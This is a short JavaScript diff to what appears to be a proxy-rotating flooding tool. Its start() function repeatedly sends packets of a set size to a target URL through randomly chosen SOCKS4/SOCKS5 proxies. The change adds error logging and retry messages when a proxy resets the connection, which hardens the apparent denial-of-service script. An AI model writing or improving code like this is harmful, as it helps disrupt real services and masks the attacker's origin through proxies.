@@ -76,7 +76,13 @@ function start(targetUrl, delay, kbSize) {
         const proxyList = Math.random() < 0.5 ? socks4Proxies : socks5Proxies;
         const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
 
-        sendPacket(targetUrl, proxy, delay, kbSize).catch(() => {});
+        sendPacket(targetUrl, proxy, delay, kbSize).catch((err) => {
+            if (err.code === 'ECONNRESET') {
+                console.error(`Connection reset by ${proxy}. Retrying with another proxy...`);
+            } else {
+                console.error(`Error with ${proxy}: ${err.message}`);
+            }
+        });
     }, delay);
 }
 
